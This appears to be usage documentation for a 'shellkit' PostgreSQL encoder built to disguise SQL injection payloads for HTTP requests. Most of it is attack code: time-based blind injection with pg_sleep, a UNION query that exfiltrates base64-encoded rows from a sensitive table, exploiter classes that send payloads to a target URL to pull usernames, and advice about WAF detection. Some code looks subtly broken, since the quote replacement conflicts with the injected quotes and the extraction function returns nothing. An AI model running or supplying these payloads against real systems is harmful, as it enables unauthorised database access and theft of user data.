# PostgreSQL HTTP Encoder Documentation

## Overview

The PostgreSQL HTTP Encoder is a specialized encoder designed for PostgreSQL SQL injection payloads. It implements specific encoding rules optimized for PostgreSQL syntax and HTTP transmission, particularly useful in blind SQL injection scenarios.

## Features

- Replaces spaces with plus signs (+)
- Replaces single quotes with PostgreSQL dollar quotes ($$)
- URL encodes special characters while preserving + and $
- Full support for PostgreSQL syntax
- Reversible encoding/decoding

## Basic Usage

```python
from shellkit.encoders.http.postgres_encoder import PostgresHTTPEncoder

# Initialize the encoder
encoder = PostgresHTTPEncoder()

# Basic encoding example
payload = "SELECT * FROM users WHERE name = 'admin'"
encoded = encoder.encode(payload)
print(f"Encoded: {encoded}")
# Output: SELECT+*+FROM+users+WHERE+name+=+$$admin$$

# Decode back to original
decoded = encoder.decode(encoded)
print(f"Decoded: {decoded}")
# Output: SELECT * FROM users WHERE name = 'admin'
```

## Integration with PostgreSQL Exploiter

```python
from shellkit.sql_injection import PostgresExploiter
from shellkit.encoders.http.postgres_encoder import PostgresHTTPEncoder

class CustomExploiter(PostgresExploiter):
    def __init__(self):
        super().__init__()
        self.encoder = PostgresHTTPEncoder()
    
    def test_injection(self, url: str):
        payload = "SELECT current_database()"
        encoded = self.encoder.encode(payload)
        return self._send_request(url + encoded)

# Usage
exploiter = CustomExploiter()
result = exploiter.test_injection("http://vulnerable.com/page.php?id=")
```

## Advanced Examples

### Handling Complex Queries
```python
# Complex query with multiple conditions
encoder = PostgresHTTPEncoder()

payload = """
SELECT username, password 
FROM users 
WHERE role = 'admin' 
AND last_login > '2024-01-01'
"""

encoded = encoder.encode(payload)
print(f"Encoded complex query: {encoded}")
```

### Handling Special Characters
```python
# Payload with special characters
payload = "SELECT * FROM users WHERE email LIKE '%@company.com'"
encoded = encoder.encode(payload)
print(f"Encoded with special chars: {encoded}")

# Payload with numbers and operators
payload = "SELECT COUNT(*) FROM users WHERE id > 1000"
encoded = encoder.encode(payload)
print(f"Encoded with operators: {encoded}")
```

### Batch Encoding
```python
def batch_encode(payloads: list) -> list:
    encoder = PostgresHTTPEncoder()
    return [encoder.encode(p) for p in payloads]

# Usage
payloads = [
    "SELECT version()",
    "SELECT current_database()",
    "SELECT current_user"
]

encoded_payloads = batch_encode(payloads)
```

## Use Cases

### Time-Based Blind Injection
```python
# Time-based injection payload
payload = """
' AND (
    SELECT CASE WHEN (
        SELECT substr(current_user,1,1)='a'
    ) THEN pg_sleep(5) 
    ELSE pg_sleep(0) 
END
)--
"""

encoder = PostgresHTTPEncoder()
encoded = encoder.encode(payload)
# Ready for HTTP transmission
```

### Data Exfiltration
```python
# Data exfiltration payload
payload = """
' UNION ALL SELECT NULL,CAST(data as varchar) 
FROM (
    SELECT encode(content::bytea, 'base64') as data 
    FROM sensitive_table
) t WHERE '1'='1
"""

encoder = PostgresHTTPEncoder()
encoded = encoder.encode(payload)
```

## Best Practices

1. **Payload Validation**
   ```python
   # Always verify encoding/decoding roundtrip
   encoder = PostgresHTTPEncoder()
   payload = "SELECT * FROM users"
   encoded = encoder.encode(payload)
   decoded = encoder.decode(encoded)
   assert payload == decoded, "Encoding/decoding mismatch"
   ```

2. **Error Handling**
   ```python
   def safe_encode(payload: str) -> str:
       try:
           encoder = PostgresHTTPEncoder()
           return encoder.encode(payload)
       except Exception as e:
           print(f"Encoding error: {str(e)}")
           return None
   ```

3. **Character Set Handling**
   ```python
   # Handle different character sets
   encoder = PostgresHTTPEncoder()
   payload = "SELECT * FROM users WHERE name = 'güest'"
   encoded = encoder.encode(payload)
   ```

## Common Issues and Solutions

### Issue 1: Double Encoding
```python
# Wrong: Double encoding
encoder = PostgresHTTPEncoder()
encoded1 = encoder.encode(payload)
encoded2 = encoder.encode(encoded1)  # Don't do this

# Correct: Single encoding
encoded = encoder.encode(payload)
```

### Issue 2: Special Characters
```python
# Handle special PostgreSQL operators correctly
encoder = PostgresHTTPEncoder()
payload = "SELECT * FROM users WHERE id <> ALL(SELECT id FROM admins)"
encoded = encoder.encode(payload)
```

## Security Considerations

1. Always validate encoded payloads before transmission
2. Be aware of WAF detection patterns
3. Consider payload length limitations
4. Handle errors gracefully to avoid information disclosure

## Integration Example

Here's a complete example showing how to integrate the PostgreSQL encoder with a custom exploitation script:

```python
from shellkit.encoders.http.postgres_encoder import PostgresHTTPEncoder
from shellkit.sql_injection import PostgresExploiter
import requests
import time

class CustomPostgresExploit:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.encoder = PostgresHTTPEncoder()
        self.exploiter = PostgresExploiter()
    
    def test_connection(self) -> bool:
        try:
            # Test simple query
            payload = "SELECT 1"
            encoded = self.encoder.encode(payload)
            response = requests.get(f"{self.target_url}?id={encoded}")
            return response.status_code == 200
        except Exception:
            return False
    
    def extract_data(self, table: str, column: str) -> list:
        results = []
        payload = f"SELECT {column} FROM {table} LIMIT 10"
        encoded = self.encoder.encode(payload)
        
        try:
            response = requests.get(f"{self.target_url}?id={encoded}")
            if response.status_code == 200:
                # Process response...
                pass
        except Exception as e:
            print(f"Error: {str(e)}")
        
        return results

# Usage
exploit = CustomPostgresExploit("http://vulnerable.com/page.php")
if exploit.test_connection():
    data = exploit.extract_data("users", "username")
    print(f"Extracted data: {data}")
```